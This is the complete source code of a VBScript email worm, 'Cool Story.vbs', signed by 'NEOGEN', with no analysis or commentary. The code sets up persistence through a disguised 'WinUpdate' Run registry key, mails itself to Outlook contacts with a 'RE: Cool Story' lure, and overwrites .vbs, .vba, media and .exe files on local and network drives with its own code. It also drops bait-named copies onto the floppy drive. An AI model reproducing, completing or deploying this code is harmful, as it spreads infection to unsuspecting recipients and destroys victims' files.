   ' Cool Story.vbs

   On error resume next
   randomize
   set
   fso=createobject("scripting.filesystemobject")
   set wscriptshell=createobject("wscript.shell")
   set drives=fso.drives
   for each drive in drives
   if drive="C:" then
   if drive.isready then
   drivefull=drive & "\"
   set e5d=fso.getfolder(drivefull)
   set subs=e5d.subfolders
   for each subfolder in subs
   subst=mid(subfolder.path,4,3)
   if subst="WIN" then
   auto=subfolder.path
   end if
   next
   end if
   end if
   next
   autos=auto & "\run32dll.vbs"
   fso.copyfile wscript.scriptfullname,autos
   wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate","wscript.exe" & " " & autos & " " & "%"
   if wscript.scriptfullname <> autos then
   all="YEAH BABY, NEOGEN JUST GOT INTO YOUR COMPUTER"
   datafiln=auto&"\Funny Story.txt"
   set dat=fso.createtextfile(datafiln,true)
   dat.write all
   dat.close
   wscriptshell.run "notepad.exe" & " " & datafiln,3
   end if
   mailed=auto & "\Funny Story.txt.vbs"
   fso.copyfile wscript.scriptfullname,mailed
   if wscriptshell.regread("HKLM\SOFTWARE\Microsoft")<>"1" then
   set out=createobject("Outlook.Application")
   if out="Outlook" then
   set mapi=out.GetNameSpace("MAPI")
   set newitem=mapi.getdefaultfolder(6)
   do while newitem.items.count<>1
   for each item in newitem.items
   do while item.Attachments.count<>0
   for each itatt in item.Attachments
   itatt.delete
   next
   loop
   item.subject="RE: Cool Story"
   item.Body="Hey, I found this really cool story, i think that you should check it out....."
   item.attachments.add mailed
   item.send
   next
   loop
   set item=Nothing
   set itatt=nothing
   set newitem=Nothing
   set newitem=mapi.getdefaultfolder(5)
   do while newitem.items.count<>1
   for each item in newitem.items
   do while item.Attachments.count<>0
   for each itatt in item.Attachments
   itatt.delete
   next
   loop
   item.subject="RE: Cool Story"
   item.Body="Hey, I found this really cool story, i think that you should check it out....."
   item.attachments.add mailed
   item.send
   next
   loop
   set item=Nothing
   set itatt=nothing
   set newitem=Nothing
   set out=Nothing
   wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft","1"
   end if
   end if
   set dr=fso.Drives
   for each d in dr
   if d.DriveType=2 or d.DriveType=3 then
   list(d.path&"\")
   end if
   next
   Sub spreadmailto (dir)
   on error resume next
   set fso=createobject("Scripting.filesystemobject")
   set f=fso.GetFolder(dir)
   set cf=f.Files
   for each fil in cf
   ext=fso.GetExtensionName(fil.path)
   ext=lcase(ext)
   if (ext="vbs") or (ext="vba") then
   fso.copyfile wscript.scriptfullname,fil.path
   end if
   next
   End Sub
   Sub list(dir)
   on error resume next
   set f=fso.GetFolder(dir)
   set ssf=f.Subfolders
   for each fil in ssf
   spreadmailto(fil.path)
   list(fil.path)
   next
   End Sub
   payl=wscriptshell.regread("HKLM\SOFTWARE\TaskManager")
   if payl="" then
   wscriptshell.regwrite "HKLM\SOFTWARE\TaskManager","1"
   end if
   if payl<> reboots then
   payl=payl+1
   wscriptshell.regwrite "HKLM\SOFTWARE\TaskManager",payl
   end if
   if payl= reboots then
   set dr=fso.Drives
   for each d in dr
   if d.DriveType=2 or d.DriveType=3 then
   listed(d.path&"\")
   end if
   next
   end if
   Sub spread (dir)
   on error resume next
   set fso=createobject("Scripting.filesystemobject")
   set f=fso.GetFolder(dir)
   set cf=f.Files
   for each fil in cf
   ext=fso.GetExtensionName(fil.path)
   ext=lcase(ext)
   if (ext="mp3") or (ext="jpg") or (ext="mpeg") or (ext="jpeg") or (ext="mpg")or (ext="exe") then
   fso.copyfile wscript.scriptfullname,fil.path
   end if
   next
   End Sub
   Sub listed(dir)
   on error resume next
   set f=fso.GetFolder(dir)
   set ssf=f.Subfolders
   for each fil in ssf
   spread(fil.path)
   listed(fil.path)
   next
   End Sub
   payl=wscriptshell.regread("HKLM\SOFTWARE\Tasks")
   if payl="" then
   wscriptshell.regwrite "HKLM\SOFTWARE\Tasks","1"
   end if
   if payl<> reboots then
   payl=payl+1
   wscriptshell.regwrite "HKLM\SOFTWARE\Tasks",payl
   end if
   if payl=reboots then
   msgbox "Yeah baby, i'm still here"
   end if
   tim=minute(time)
   tim=tim+6
   set thiscode=fso.opentextfile(wscript.scriptfullname,1)
   code=thiscode.readall
   thiscode.close
   do
   if not (fso.fileexists(autos)) then
   set resur=fso.createtextfile(autos,true)
   resur.write code
   resur.close
   end if
   regvalue=wscriptshell.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate")
   if regvalue <> "wscript.exe" & " " & autos & " " & "%"  then
   wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate","wscript.exe" & " " & autos & " " & "%"
   end if
   regvalue=""
   timstandard=minute(time)
   if tim>53 then
   tim=01
   end if
   if timstandard=tim then
   tim=minute(time)
   tim=tim+6
   trig=int((10*rnd)+1)
   select case trig
   case 1
   floppya="a:\PIZZABOY.txt.vbs"
   case 2
   floppya="a:\YOU-ARE-DOOMED.txt.vbs"
   case 3
   floppya="a:\JESUS666.txt.vbs"
   case 4
   floppya="a:\ANDRIANA-SKLENARIKOVA.JPG.vbs"
   case 5
   floppya="a:\DE NIRO FUCKS NAOMI.JPG.vbs"
   case 6
   floppya="a:\SPIDERMAN_LIVES.txt.vbs"
   case 7
   floppya="a:\HACKING_WINDOWS.TXT.vbs"
   case 8
   floppya="a:\EUROVISION_ORGY.JPG.vbs"
   case 9
   floppya="a:\Sex_Advices.txt.vbs"
   case else
   floppya="a:\MELINDA'S EYES.JPG.vbs"
   end select
   set repla=fso.createtextfile(floppya,true)
   repla.write code
   repla.close
   set repla=nothing
   floppya=""
   loop
